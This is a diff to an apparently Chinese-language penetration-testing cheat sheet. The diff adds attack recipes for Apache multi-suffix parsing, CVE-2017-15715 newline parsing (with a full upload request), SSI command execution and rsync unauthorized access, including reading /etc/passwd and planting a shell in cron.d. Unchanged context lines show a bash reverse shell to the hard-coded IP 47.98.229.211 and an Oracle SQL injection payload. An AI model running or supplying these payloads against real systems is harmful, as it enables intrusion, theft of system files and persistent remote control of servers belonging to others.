@@ -23,7 +23,7 @@
 			* [waf绕过](#waf绕过)
 		 * [oracle注入](#oracle注入)
 			* [联合查询](#联合查询)
-			* [报错注入](#报错注入)
+			* [Oracle报错注入](#Oracle报错注入)
 			* [带外注入](#带外注入)
 			* [时间盲注](#时间盲注)
 	* [命令及后门相关](#命令及后门相关)
@@ -41,7 +41,13 @@
 		* [php反弹shell](#php反弹shell)
 		* [python反弹shell](#python反弹shell)
 		* [bash反弹shell](#bash反弹shell)
-
+	* [漏洞知识](#漏洞知识)
+		* [Apache漏洞](#Apache漏洞)
+			* [Apache_HTTPD_多后缀解析漏洞](#Apache_HTTPD_多后缀解析漏洞)
+			* [Apache_HTTPD_换行解析漏洞](#Apache_HTTPD_换行解析漏洞)
+			* [Apache_SSI_远程命令执行漏洞](#Apache_SSI_远程命令执行漏洞)
+		* [rsync_未授权访问漏洞](#rsync_未授权访问漏洞)
+		
 				
 ## 信息收集
 
@@ -303,7 +309,7 @@ file_name(@@version)
 ' and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写的）') from dual--+
 ```
 
-#### 报错注入
+#### Oracle报错注入
 
 - 获取当前数据库用户
 ```
@@ -589,3 +595,64 @@ nc -lvvp 4444
 受害机
 bash -i >& /dev/tcp/47.98.229.211/4444 0>&1
 ```
+
+
+## 漏洞基础
+> **Apache、** 
+
+### Apache漏洞
+> **Apache相关漏洞概述** 
+
+#### Apache_HTTPD_多后缀解析漏洞
+```
+条件：httpd.conf中配置如下：AddHandler application/x-httpd-php .php
+
+那就可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件进行getshell
+
+```
+#### Apache_HTTPD_换行解析漏洞
+```
+条件：2.4.0~2.4.29版本（CVE-2017-15715），以hex形式在数据包中的xxx.php后添加0a，放包后浏览器访问 xxx.php%0a 进行getshell
+
+
+上传的数据包：
+------WebKitFormBoundary38LloOXE0KEPGEGk
+Content-Disposition: form-data; name="file"; filename="1.jpg"
+Content-Type: application/octet-stream
+
+<?php
+phpinfo();  
+?>
+------WebKitFormBoundary38LloOXE0KEPGEGk
+Content-Disposition: form-data; name="name"
+
+xxx.php
+
+------WebKitFormBoundary38LloOXE0KEPGEGk--
+
+```
+#### Apache_SSI_远程命令执行漏洞
+```
+条件：服务器开启了SSI与CGI支持，那么可以上传一个 xxx.shtml 文件来执行任意命令
+
+xxx.shtml内容：
+<!--#exec cmd="whoami" -->
+
+上传xxx.shtml完成后，直接浏览器访问 xxx.shtml 即可执行whoami命令
+```
+
+### rsync_未授权访问漏洞
+```
+查看远程tarket-ip的模块名列表:
+rsync rsync://tarket-ip:873/
+
+列出path模块下的文件：
+rsync rsync://tarket-ip:873/path/
+
+下载任意文件到本地 ./ 下：
+rsync -av rsync://tarket-ip:873/path/etc/passwd ./
+
+上传任意文件：
+rsync -av shell rsync://tarket-ip:873/path/etc/cron.d/shell
+```
+
